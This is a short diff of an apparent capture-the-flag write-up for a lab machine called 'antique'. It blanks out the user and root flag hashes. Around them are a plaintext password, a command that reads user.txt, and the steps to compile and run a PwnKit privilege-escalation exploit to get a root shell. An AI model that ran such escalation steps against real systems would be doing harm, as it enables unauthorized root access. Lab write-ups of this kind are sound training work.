@@ -48,7 +48,7 @@ P@ssw0rd@123!!123
 Pass : P@ssw0rd@123!!123
 
 > exec cat user.txt
-027d56b2d637e1f9a55cb1c0f03bd2be
+
 
 
 [+]INTRUSION[+]
@@ -69,4 +69,4 @@ lp@antique:/dev/shm$ gcc -shared PwnKit.c -o PwnKit -Wl,-e,entry -fPIC
 lp@antique:/dev/shm$ ./PwnKit
 
 root@antique:/dev/shm# cat /root/root.txt 
-3a50f55329061abf17898741b57e743f
+
